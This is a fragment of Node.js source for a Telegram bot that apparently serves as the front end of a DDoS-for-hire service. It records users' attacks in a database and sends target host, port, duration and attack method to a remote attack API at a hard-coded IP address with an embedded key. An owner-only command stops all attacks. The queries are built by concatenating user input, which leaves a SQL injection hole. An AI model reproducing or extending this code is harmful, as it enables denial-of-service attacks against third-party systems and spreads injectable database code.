    ...
    connection.query("SELECT * FROM user WHERE tg_id = " + fromId + "", function (err, result, fields) {
        connection.query("SELECT * FROM attack WHERE tg_id = " + fromId + " AND time_end >= " + Math.floor(new Date() / 1000) + "", function (err1, result1, fields1) {
            ...
            if(attack != '0') {
                request.get(
                    {
                        url: 'http://95.163.243.12/api.php?key=XNb2tDwvlUon55KwnR7MkcN3MBrqSrbvhhSfOQ3xZHtwLBeSGQGJFyNR5tP8b7u38dU48eosvsa9PnjbMAqWvhWP7DAb0OtbVDk&host=' + host + '&port=' + port + '&time=' + time + '&method=' + method +''
                    }
                );
...
bot.onText(/\/stopall/, function (msg, match) {
    ...
    connection.query("SELECT * FROM user WHERE tg_id = " + fromId + "", function (err, result, fields) {
        ...
        if(result[0].plan == 'Owner') {
            ...
            request.get(
                {
                    url: 'http://95.163.243.12/api.php?key=XNb2tDwvlUon55KwnR7MkcN3MBrqSrbvhhSfOQ3xZHtwLBeSGQGJFyNR5tP8b7u38dU48eosvsa9PnjbMAqWvhWP7DAb0OtbVDk&host=https://google.com/&port=80&time=120&method=stopall'
                }
            );
